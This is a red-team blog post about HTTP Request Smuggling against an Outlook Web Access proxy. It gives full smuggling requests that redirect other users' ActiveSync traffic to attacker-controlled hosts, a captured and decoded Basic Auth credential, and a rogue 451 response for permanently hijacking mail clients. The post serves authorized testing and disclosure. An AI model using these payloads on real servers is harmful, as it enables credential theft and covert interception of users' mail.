<!DOCTYPE html><html lang="en"><head><meta charset="utf-8" /><meta http-equiv="X-UA-Compatible" content="IE=edge" /><meta name="viewport" content="width=device-width, initial-scale=1" /><link rel="stylesheet" href="/css/template.css?version=2.0.1" /><link rel="shortcut icon" href="/img/favicon.svg?version=2.0.1" type="image/svg+xml" /> <script src="/js/template.js?version=2.0.1"></script><meta name="theme-color" content="#e6e6e6" media="(prefers-color-scheme: light)" /><meta name="theme-color" content="#e6e6e6" media="(prefers-color-scheme: dark)" /><title>Harvesting credentials via HTTP Request Smuggling</title><meta property="og:title" content="Harvesting credentials via HTTP Request Smuggling"><meta name="description" itemprop="description" content="By abusing an HTTP Request Smuggling vulnerability on Outlook Web Access (OWA) for Exchange, it is possible to steal credentials of unsuspecting Active Directory users trying to authenticate to OWA."><meta property="og:description" content="By abusing an HTTP Request Smuggling vulnerability on Outlook Web Access (OWA) for Exchange, it is possible to steal credentials of unsuspecting Active Directory users trying to authenticate to OWA."><meta name="keywords" content="http, request, smuggling, desynchronization, hrs, red team, initial foothold, technical, vulnerability, exchange, outlook"><meta name="language" content="english"><meta name="author" itemprop="creator" content="Tijme Gommers"><meta name="robots" content="index, follow"><meta name="distribution" content="global"><meta name="copyright" content="Copyright © 2024 Tijme Gommers. All rights reserved."><link rel="alternate" type="application/rss+xml" title="Atom" href="/feeds/atom.xml"></head><body><div class="navbar-wrapper mb-4"><div class="container"><div class="row justify-content-center"><div class="col-12 col-sm-12 col-md-12 col-lg-11 col-xl-8 col-xll-6"><nav class="navbar navbar-expand"><div class="collapse navbar-collapse"><ul class="navbar-nav me-auto"><li class="nav-item"> <a href="/" target="_self" class="nav-link"> <span>Posts</span> </a></li><li class="nav-item"> <a href="/about/" target="_self" class="nav-link"> <span>About</span> </a></li><li class="nav-item"> <a href="/donate/" target="_self" class="nav-link"> <span>Donate</span> </a></li></ul><ul class="navbar-nav"><li class="nav-item"> <a href="https://twitter.com/tijme" target="_blank" rel="noopener noreferrer" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#twitter"/></svg> </span></span> </a></li><li class="nav-item d-none d-sm-block"> <a href="https://www.linkedin.com/in/tijme/" target="_blank" rel="noopener noreferrer" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#linkedin"/></svg> </span></span> </a></li><li class="nav-item d-none d-sm-block"> <a href="https://github.com/tijme/" target="_blank" rel="noopener noreferrer" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#github"/></svg> </span></span> </a></li><li class="nav-item d-none d-sm-block"> <a href="/feeds/atom.xml" target="_blank" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#rss"/></svg> </span></span> </a></li></ul></div></nav></div></div></div></div><div class="container"><div class="row justify-content-center"><div class="col-12 col-sm-12 col-md-12 col-lg-11 col-xl-8 col-xll-6"><article class="container-fluid"><h1 class="mb-2">Harvesting credentials via HTTP Request Smuggling</h1><p class="mb-2 text-muted">Posted on <time datetime="2021-04-19T00:00:00+00:00">19 April 2021</time> by Tijme Gommers.</p><p>Exploiting public-facing services is one of the many ways to gain an initial foothold within a network. And it’s not uncommon to see this in the wild. Various adversaries are known to abuse vulnerabilities such as buffer overflows (<a href="https://attack.mitre.org/groups/G0098/" target="_blank" rel="noopener noreferrer">G0098</a>), SQL injections (<a href="https://attack.mitre.org/groups/G0087/" target="_blank" rel="noopener noreferrer">G0087</a>) or other (known) vulnerabilities with functional exploit code (<a href="https://attack.mitre.org/groups/G0016/" target="_blank" rel="noopener noreferrer">G0016</a>).</p><p>As a red team, it’s our task to simulate these adversaries. A red team engagement is a realistic simulation of an adversary that fits the threat profile of the customer. During the simulation, we try to gain access to the crown jewels of the customer using techniques that are known to be used by the adversary. Note that these techniques are not limited to the abuse of technical vulnerabilities, but also include the business (e.g. password policies) and behavioural (e.g. social engineering) aspect. Red team engagements can be used to train blue teams in detecting and acting upon similar attacks, as well as to check how cyber resilient customers are against these attacks.</p><p>This blog describes an HTTP Request Smuggling (HRS) vulnerability that we identified during one of our engagements. It can be used to simulate exploiting public-facing services while gaining an initial foothold within the network of a customer. In our case it allowed us to harvest Active Directory credentials which we used to sign into Outlook Web Access (OWA) to view sensitive data.</p><p>Afterwards, this blog post will go on to describe how to gain persistent access to OWA by migrating clients to a rogue man-in-the-middle Exchange server.</p><h3 id="http-request-smuggling">HTTP Request Smuggling</h3><p>HTTP Request Smuggling (HRS) vulnerabilities are pretty common nowadays. In 2005 CGISecurity published a <a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank" rel="noopener noreferrer">white paper</a> that detailed how the vulnerability arises, what it can inflict and how it can be mitigated. If you’re not sure how HRS works, I highly recommended to read that white paper or PortSwigger’s <a href="https://portswigger.net/web-security/request-smuggling&quot;" target="_blank" rel="noopener noreferrer">blog post</a> on HRS, to get yourself familiar. In short, HRS arises when a webserver and a proxy can be desynchronized. A threat actor can send a request that is interpreted differently in the frontend server than in the backend server. For instance, the threat actor sends a specially crafted request that is interpreted by the frontend server as 1 request, but is interpreted by the backend server as effectively 2 requests. The second request is thus “smuggled” past the frontend server and ends up at the backend server. This response on that request will then be served up to the next visitor, as James Kettle from PortSwigger describes, as James Kettle from PortSwigger <a href="https://hackerone.com/reports/498052" target="_blank" rel="noopener noreferrer">describes</a>.</p><p>Abusing HRS can greatly affect the confidentiality, integrity and availability of systems. As <a href="https://hackerone.com/reports/737140" target="_blank" rel="noopener noreferrer">published</a> in a responsible disclosure, Evan Custodio was able to take over Slack accounts by abusing HRS to steal cookies. Other examples include <a href="https://hackerone.com/reports/498052" target="_blank" rel="noopener noreferrer">credential theft</a> on New Relic and <a href="https://hackerone.com/reports/526880" target="_blank" rel="noopener noreferrer">user redirecting</a> on the U.S. Dept Of Defense infrastructure.</p><p>In our case, HRS allowed us to harvest Active Directory credentials, which is described in the attack narrative below. This attack narrative includes the entire path, from zero to hero, just like we abused it during our engagement.</p><h3 id="attack-narrative">Attack narrative</h3><h4 id="identifying-proxied-infrastructure">Identifying proxied infrastructure</h4><p>During an engagement for one of our customers, our goal was to get an initial foothold by penetrating their digital infrastructure. As automated scans did not yield results, we soon switched to manual research. Various services, including Outlook Web Access (OWA), were identified while brute-forcing subdomains using the tool <a href="https://github.com/OJ/gobuster" target="_blank" rel="noopener noreferrer">GoBuster</a>. The wordlist in use was generated by <a href="https://github.com/bitquark/dnspop/blob/master/results/bitquark_20160227_subdomains_popular_100000" target="_blank" rel="noopener noreferrer">@bitquark</a> and contains the 100.000 most frequently used subdomains.</p><figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nv">$ </span>gobuster dns <span class="nt">-d</span> customer.com <span class="nt">-i</span> <span class="nt">-w</span> ~/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt <span class="nt">--wildcard</span>

<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Domain:            customer.com
<span class="o">[</span>+] Threads:           10
<span class="o">[</span>+] Show IPs:          <span class="nb">true</span>
<span class="o">[</span>+] Wildcard forced:   <span class="nb">true</span>
<span class="o">[</span>+] Timeout:           1s
<span class="o">[</span>+] Wordlist:          ~/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
<span class="o">===============================================================</span>
1337/07/16 15:30:59 Starting gobuster <span class="k">in </span>DNS enumeration mode
<span class="o">===============================================================</span>
Found: dev.customer.com <span class="o">[</span>153.92.999.999]
Found: www.customer.com <span class="o">[</span>80.148.999.999]
Found: owa.customer.com <span class="o">[</span>86.213.999.999] &lt;<span class="nt">--</span> Outlook Web Access <span class="o">(</span>OWA<span class="o">)</span>
<span class="nt">--</span> snip <span class="nt">--</span></code></pre></figure><p>While examining these services, we discovered that we were communicating with a proxy. There are several methods for detecting if a service runs behind a proxy. A commonly used technique for web applications is to send the following request to the applications, which contains another URI in the first line of the request.</p><p>Request:</p><figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">https://actually-request-this-site.com/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">owa.customer.com</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Netscape/8.0.4</span></code></pre></figure><p>A regular webserver would generate a “421 Misdirected Request” response. An example is included below.</p><p>Response:</p><figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">421</span> <span class="ne">Misdirected Request</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">322</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=iso-8859-1</span>

-- snip --
<span class="nt">&lt;p&gt;</span>The client needs a new connection for this request as the requested host name does not match the Server Name Indication (SNI) in use for this connection.<span class="nt">&lt;/p&gt;</span>
-- snip -- </code></pre></figure><p>However, when we ran this against <code class="language-plaintext highlighter-rouge">owa.customer.com</code>, the server returned the following response, a <code class="language-plaintext highlighter-rouge">302 Moved Temporarily</code>. Back then, I personally thought this redirect was typical behaviour for an HTTP proxy. However, later it sank in to me that it should have been a <code class="language-plaintext highlighter-rouge">200 OK</code> or <code class="language-plaintext highlighter-rouge">203 Non-Authoritative Information</code> with the actual response body, as stated in <a href="https://tools.ietf.org/html/rfc7230" target="_blank" rel="noopener noreferrer">RFC7230</a>.</p><p>Response:</p><figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Moved Temporarily</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">https://actually-request-this-site.com/owa/</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">server1</span>
<span class="na">X-FEServer</span><span class="p">:</span> <span class="s">US-EXCH-008</span>
<span class="s">-- snip --</span></code></pre></figure><p>Something that does however reveal that a proxy in use, is the <code class="language-plaintext highlighter-rouge">Server</code> header, with <code class="language-plaintext highlighter-rouge">server1</code> as value. This is a non-default value for Microsoft IIS servers. By default, the value is <code class="language-plaintext highlighter-rouge">Microsoft-IIS/8.5</code> (or another version). This indicates that, most likely, a proxy altered the response.</p><p>Now that we have the indication that <code class="language-plaintext highlighter-rouge">owa.customer.com</code> is proxied, we can continue with checking if it is vulnerable to HRS.</p><h4 id="identifying-vulnerable-proxy-setups">Identifying vulnerable proxy setups</h4><p>With James Kettle’s research in mind, we set out to investigate whether this setup is potentially vulnerable to HRS. To identify if <code class="language-plaintext highlighter-rouge">owa.customer.com</code> is vulnerable to HRS, we sent the following request.</p><figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/owa/auth/logon.aspx?2whS=929722944</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="s"> Transfer-Encoding: chunked</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">owa.customer.com</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">nl,en-US;q=0.7,en;q=0.3</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">124</span>

44
6kqfa=x&amp;url=https%3a%2f%2fowa.customer.com%2fowa%2f&amp;reason=0&amp;whfto=x
0

GET https://hacker.com/ HTTP/1.0
X-Ignore: 1</code></pre></figure><p>This request has a <code class="language-plaintext highlighter-rouge">Content-Length</code> of 124, which is the entire body. It will be posted to the proxy, which will use it to determine that the body is 124 bytes long. The request is then forwarded to the actual OWA service.</p><p>If this setup is vulnerable to HRS, OWA handles the request differently (using chunked encoding instead of using the content length). Chunked encoding allows a client to send chunks of data in the body. In this case there is one chunk of data. This starts with the hexadecimal <code class="language-plaintext highlighter-rouge">44</code>, which is <code class="language-plaintext highlighter-rouge">68</code> if converted to decimal. This is the length of the chunk body, which can be seen on the next line. After the 68 characters, the request is terminated with a chunk of size <code class="language-plaintext highlighter-rouge">0</code>. <em>This is a normal request that OWA accepts.</em></p><p>However, the part after the termination is left unprocessed. The OWA service will treat it as part of the next request sent by the proxy (possibly from another user).</p><p>This also works the other way around (if the proxy uses chunked encoding and OWA uses the content length). There are multiple ways infrastructures can be vulnerable to HRS. All of these ways are described in the <a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener noreferrer">blog</a> of PortSwigger. Actually, the real trick that we used is that we inserted a space before the transfer encoding header; ` Transfer-Encoding: chunked<code class="language-plaintext highlighter-rouge">. The proxy was unable to parse it and used the </code>Content-Length<code class="language-plaintext highlighter-rouge"> to determine the body length. However, OWA *was* able to parse it and used the </code>Transfer-Encoding` header to determine the body length.</p><p>When we executed the request above, we got the following response from the server.</p><figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache, no-store</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
<span class="na">Expires</span><span class="p">:</span> <span class="s">-1</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">server1</span>
<span class="na">request-id</span><span class="p">:</span> <span class="s">59b59708-3551-44ec-8e05-1e8be2e11859</span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">ClientId=MMEESFDUOFIVCMQNW; expires=Wed, 30-Mar-2022 20:57:55 GMT; path=/; HttpOnly</span>
<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
<span class="na">X-AspNet-Version</span><span class="p">:</span> <span class="s">4.0.30319</span>
<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">ASP.NET</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 30 Mar 2021 20:57:54 GMT</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">28032</span>

<span class="cp">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"&gt;</span>
<span class="c">&lt;!-- Copyright (c) 2011 Microsoft Corporation.  All rights reserved. --&gt;</span>
<span class="c">&lt;!-- OwaPage = ASP.auth_logon_aspx --&gt;</span>
-- snip --</code></pre></figure><p>As can be seen, the response status is <code class="language-plaintext highlighter-rouge">200 OK</code>, meaning our request was valid, and the server returned a valid response. At first, I thought this meant it did not interpret the second part of our body, as it would then have produced a <code class="language-plaintext highlighter-rouge">400 Bad Request</code> response status. I thought that the proxy/OWA setup was most likely vulnerable. However, after additional research it turned out OWA accepts any arbitrary POST data.</p><p>A verification method with more certainty is to check if another user received the response on our request in the second part of the request body. As the request in the second part of our body normally returns a <code class="language-plaintext highlighter-rouge">301 Moved Permanently</code>, another user should now have been redirected to the <code class="language-plaintext highlighter-rouge">hacker.com</code> domain, as that user got the redirect as a response on their request. To verify this, we checked the access log of <code class="language-plaintext highlighter-rouge">hacker.com</code>. The important part of it has been included below.</p><figure class="highlight"><pre><code class="language-shell" data-lang="shell">root@hacker:/home/tijme# <span class="nb">tail</span> <span class="nt">-f</span> /var/log/apache2/other_vhosts_access.log
hacker.com:443 52.12.999.999 - - <span class="o">[</span>19/Dec/2091:12:09:29 +0200] <span class="s2">"OPTIONS /Microsoft-Server-ActiveSync?Cmd=Options&amp;User=alice@customer.com&amp;DeviceId=e1568c571e684e0fb1724da85d215dc0&amp;DeviceType=Outlook HTTP/1.1"</span> 200 3473 <span class="s2">"-"</span> <span class="s2">"Outlook-iOS-Android/1.0"</span></code></pre></figure><p>And indeed, it turns out it is vulnerable! One of the users got redirected to our <code class="language-plaintext highlighter-rouge">hacker.com</code> domain, which shows that the HRS request was executed successfully.</p><p>Looking at the access log I thought something interesting was happening though. In my opinion the victim should actually have made a <code class="language-plaintext highlighter-rouge">GET</code> request to the root or the <code class="language-plaintext highlighter-rouge">/owa</code> endpoint of <code class="language-plaintext highlighter-rouge">hacker.com</code>, instead of making an <code class="language-plaintext highlighter-rouge">OPTIONS</code> request to the <code class="language-plaintext highlighter-rouge">Microsoft-Server-ActiveSync</code> endpoint (as it was redirected). However, after looking through <a href="https://tools.ietf.org/html/rfc7231#section-6.4.2&quot;" target="_blank" rel="noopener noreferrer">RFC7231</a> it became clear that a client that receives a <code class="language-plaintext highlighter-rouge">301 Moved Permanently</code> <em>may</em> maintain its request method and body for the subsequent request, just like a <code class="language-plaintext highlighter-rouge">308 Permanent Redirect</code> (in which the client is <em>required</em> to maintain the request method and body).</p><p>All in all, this means it might be possible to capture more information from the user, which we will cover in the next chapters.</p><h4 id="gaining-situational-awareness">Gaining situational awareness</h4><p>As seen in the access logs of <code class="language-plaintext highlighter-rouge">hacker.com</code>, the victim tried to perform a synchronization action using <code class="language-plaintext highlighter-rouge">Microsoft-Server-ActiveSync</code>. <a href="https://docs.microsoft.com/en-us/exchange/clients/exchange-activesync/exchange-activesync" target="_blank" rel="noopener noreferrer">ActiveSync</a> is an HTTP protocol which enables users to download mail from an Exchange server, instead of using OWA which only enables the user to view mail in a web client.</p><p><a href="/img/harvesting-active-directory-credentials-via-http-request-smuggling/1_normal_flow.svg" target="_blank" rel="noopener noreferrer" data-lightbox="normal-flow" data-title="A normal synchronization flow"><img src="/img/harvesting-active-directory-credentials-via-http-request-smuggling/1_normal_flow.svg" alt="A normal synchronization flow" /></a></p><p>One can configure ActiveSync in various mail clients, such as <a href="https://support.apple.com/en-us/HT201729" target="_blank" rel="noopener noreferrer">Apple Mail</a>. As can be seen in Apple’s manual for connecting to an ActiveSync endpoint, users have to provide a server, domain, username and password. These details will most likely be sent to the server via HTTP requests. Either during configuration or in every request.</p><p>When the credentials are sent to the server actually depends on the type of authentication configured in Exchange. Common types of authentication are “<a href="https://docs.microsoft.com/en-us/exchange/clients/outlook-for-ios-and-android/use-hybrid-modern-auth?view=exchserver-2019" target="_blank" rel="noopener noreferrer">Modern Authentication</a>”, which uses the SAML protocol and therefore generates an authentication token after initial authentication with username and password. The authentication type “<a href="https://docs.microsoft.com/en-us/exchange/clients/outlook-for-ios-and-android/use-basic-auth" target="_blank" rel="noopener noreferrer">Basic Auth</a>” is a method of authenticating by sending a username and password (base64 encoded) in every HTTP request.</p><p>Are you starting to get excited yet? If an Exchange server is configured to use ActiveSync with Basic Auth, users are sending username and passwords in every single HTTP request. As we are able to perform HRS, we might be able to intercept these credentials!</p><h4 id="harvesting-and-abusing-credentials">Harvesting and (ab)using credentials</h4><p>We currently know that a successful HRS attack can redirect a victim to a rogue server, that mail clients maintain the request method and most likely also the headers and body, and we know that victims sent their base64 encoded credentials in every ActiveSync request. This means we’re just one step away from capturing these credentials.</p><p>Capturing request headers on our rogue server can be done in various ways. For this proof-of-concept I chose to use <a href="https://portswigger.net/burp/documentation/collaborator" target="_blank" rel="noopener noreferrer">Burp Collaborator</a>, which acts as a catch all server for HTTP and various other protocols.</p><p>I altered the initial HRS request to redirect the victim to my Burp Collaborator URI instead of <code class="language-plaintext highlighter-rouge">hacker.com</code>. The final request is included below</p><figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/owa/auth/logon.aspx?2whS=929722944</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="s"> Transfer-Encoding: chunked</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">owa.customer.com</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">nl,en-US;q=0.7,en;q=0.3</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">165</span>

44
6kqfa=x&amp;url=https%3a%2f%2fowa.customer.com%2fowa%2f&amp;reason=0&amp;whfto=x
0

GET https://xcdf8ar1e2dnaqc1t7ebdyt8gzp5e.burpcollaborator.net/ HTTP/1.1
X-Ignore: 1</code></pre></figure><p>A few moments later, as expected, Burp Collaborator catches the ActiveSync request from the victim 🎉.</p><figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/Microsoft-Server-ActiveSync?User=bob@customer.com&amp;DeviceId=e1568c571e684e0fb1724da85d215dc0&amp;DeviceType=iPhone&amp;Cmd=FolderSync</span>  <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">xcdf8ar1e2dnaqc1t7ebdyt8gzp5e.burpcollaborator.net</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/vnd.ms-sync.wbxml</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">nl-nl</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate, br</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">MS-ASProtocolVersion</span><span class="p">:</span> <span class="s">14.1</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Apple-iPhone11C8/1804.70</span>
<span class="na">Authorization</span><span class="p">:</span> <span class="s">Basic Y3VzdG9tZXIuY29tXGJvYjpodW50ZXIy</span>
<span class="na">Content-Lengh</span><span class="p">:</span> <span class="s">13</span>
<span class="na">X-MS-PolicyKey</span><span class="p">:</span> <span class="s">0</span>

jVR0</code></pre></figure><p>We have successfully captured the Authorization header which contains the encoded credentials of the victim.</p><figure class="highlight"><pre><code class="language-plain" data-lang="plain">$ echo Y3VzdG9tZXIuY29tXGJvYjpodW50ZXIy | base64 -D
customer.com\bob:hunter2</code></pre></figure><p>The HRS attack is visualized in the figure below.</p><p><a href="/img/harvesting-active-directory-credentials-via-http-request-smuggling/2_malicious_sync.svg" target="_blank" rel="noopener noreferrer" data-lightbox="malicious-flow" data-title="A malicious synchronization flow"><img src="/img/harvesting-active-directory-credentials-via-http-request-smuggling/2_malicious_sync.svg" alt="A malicious synchronization flow" /></a></p><h4 id="permanently-migrating-the-victims-mailbox-to-our-rogue-exchange-server">Permanently migrating the victims’ mailbox to our rogue exchange server</h4><h5 id="the-undocumented-feature">The <del>un</del>documented feature</h5><p>As a red team, we would like to delve deeper into the possible impact of this finding. For this reason, we looked for further options from a threat actor’s point of view, the most notable of which was to gain permanent access to the victims’ credentials. It turns out that ActiveSync has a ‘<a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-ashttp/5702eaaa-e958-4c7f-8f31-71375b87228c" target="_blank" rel="noopener noreferrer">feature</a>’ to automatically update the configuration of mail clients if the mailbox of the user was migrated from on premises to Office365. This feature works as follows (and as demonstrated in the visual).</p><ol><li>The client tries to retrieve mail via the HTTP ActiveSync protocol.</li><li>Exchange checks if the mailbox of the user exists or if it is migrated to Office365.</li><li>The DC returns that the mailbox is not found (this means it was migrated).</li><li>Exchange tries to get the TargetOWAURL of the domain (which is where the mailbox is hosted).</li><li>The DC returns the TargetOWAURL (outlook.office365.com in this case).</li><li>Exchange responds to the client with a HTTP 451 redirect to the TargetOWAURL.</li><li>The client uses the TargetOWAURL for all future requests.</li><li>The HTTP ActiveSync request to TargetOWAURL was successful.</li></ol><p><a href="/img/harvesting-active-directory-credentials-via-http-request-smuggling/3_legit_migration.svg" target="_blank" rel="noopener noreferrer" data-lightbox="legitimate-migration" data-title="Legitimate migration of Exchange client"><img src="/img/harvesting-active-directory-credentials-via-http-request-smuggling/3_legit_migration.svg" alt="Legitimate migration of Exchange client" /></a></p><p>So, to conclude, if the Exchange server responds with a <code class="language-plaintext highlighter-rouge">451 Unavailable For Legal Reasons</code> in combination with the <code class="language-plaintext highlighter-rouge">X-MS-Location</code> header, the victims Exchange server configuration is updated accordingly. An example of such a response is included below.</p><figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">451</span> <span class="ne">Unavailable For Legal Reasons </span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 12 Mar 2009 20:16:22 GMT</span>
<span class="na">X-MS-Location</span><span class="p">:</span> <span class="s">https://mail.contoso.com/Microsoft-Server-ActiveSync</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span></code></pre></figure><p>However, using our HRS attack it is not possible to generate a <code class="language-plaintext highlighter-rouge">451 Unavailable For Legal Reasons</code> for the victim. It is only possible to generate a <code class="language-plaintext highlighter-rouge">301 Moved Permanently</code>, as that is the response when adding a URI to the first line of a GET request. We can however redirect the victim using the <code class="language-plaintext highlighter-rouge">301 Moved Permanently</code> to our rogue server, which responds with a <code class="language-plaintext highlighter-rouge">451 Unavailable For Legal Reasons</code> to a rogue exchange server subsequently. If we make sure that the rogue exchange server is simply a proxy to the legitimate environment, we can permanently man-in-the-middle all of the victims’ ActiveSync requests, while the victim won’t notice a thing. The attack is demonstrated below.</p><p><a href="/img/harvesting-active-directory-credentials-via-http-request-smuggling/4_malicious_migration.svg" target="_blank" rel="noopener noreferrer" data-lightbox="malicious-migration" data-title="Malicious migration of Exchange client"><img src="/img/harvesting-active-directory-credentials-via-http-request-smuggling/4_malicious_migration.svg" alt="Malicious migration of Exchange client" /></a></p><h5 id="migrating-the-victims-mailbox-to-our-rogue-exchange">Migrating the victims’ mailbox to our rogue exchange</h5><p>To demonstrate that the above theory works, we connected a ‘victim’ (tgad.local\<strong>bob</strong>) to our demo environment; an Exchange server behind the proxy <code class="language-plaintext highlighter-rouge">tgvmex01.local</code>. Bob is connected using ActiveSync. His iOS Exchange configuration is included below.</p><p><a href="/img/harvesting-active-directory-credentials-via-http-request-smuggling/5_legitimate_settings.png" target="_blank" rel="noopener noreferrer" data-lightbox="legitimate-settings" data-title="Legitimate settings of the Exchange client"><img src="/img/harvesting-active-directory-credentials-via-http-request-smuggling/5_legitimate_settings.png" alt="Legitimate settings of the Exchange client" /></a></p><p>A threat actor that would like to migrate Bob’s mailbox to a rogue exchange server needs to start by performing an HRS attack which redirects Bob’s ActiveSync requests to a rogue server. An example is included below.</p><figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/owa/auth/logon.aspx?2whS=929722944</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="s"> Transfer-Encoding: chunked</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">tgvmex01.proxy</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">nl,en-US;q=0.7,en;q=0.3</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">160</span>

3F
6kqfa=x&amp;url=https%3a%2ftgvmex01.proxy%2fowa%2f&amp;reason=0&amp;whfto=x
0

GET https://rogue-server.remote/ HTTP/1.1
X-Ignore: X</code></pre></figure><p>The server <code class="language-plaintext highlighter-rouge">rogue-server.com</code> always serves the same response, no matter what the request is. This response is included below and has the <code class="language-plaintext highlighter-rouge">451 Unavailable For Legal Reasons</code> status with the rogue exchange server in the response headers.</p><figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">451</span> <span class="ne">Unavailable For Legal Reasons</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 08 Apr 2021 18:14:22 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.46 (Debian)</span>
<span class="na">X-MS-Location</span><span class="p">:</span> <span class="s">https://rogue-exchange.remote/</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
